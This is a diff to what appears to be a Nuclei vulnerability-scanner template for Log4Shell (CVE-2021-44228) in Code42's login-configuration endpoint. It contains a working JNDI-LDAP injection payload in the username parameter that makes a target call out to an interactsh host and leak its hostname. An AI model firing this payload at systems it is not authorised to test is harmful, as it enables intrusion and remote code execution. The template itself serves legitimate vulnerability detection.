@@ -21,11 +21,17 @@ info:
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
   tags: jndi,log4j,rce,cve,cve2021,oast,code42,kev
+  metadata:
+    max-request: 1
+
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
 
 http:
   - method: GET
     path:
-      - '{{BaseURL}}/c42api/v3/LoginConfiguration?username=${jndi:ldap://${hostName}.{{interactsh-url}}/test}&url=https://localhost'
+      - '{{BaseURL}}/c42api/v3/LoginConfiguration?username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&url=https://localhost'
 
     matchers-condition: and
     matchers:
@@ -37,13 +43,23 @@ http:
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Match for extracted ${hostName} variable
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
     extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output
+
       - type: regex
         part: interactsh_request
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${hostName} in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
 # Enhanced by mp on 2022/05/27
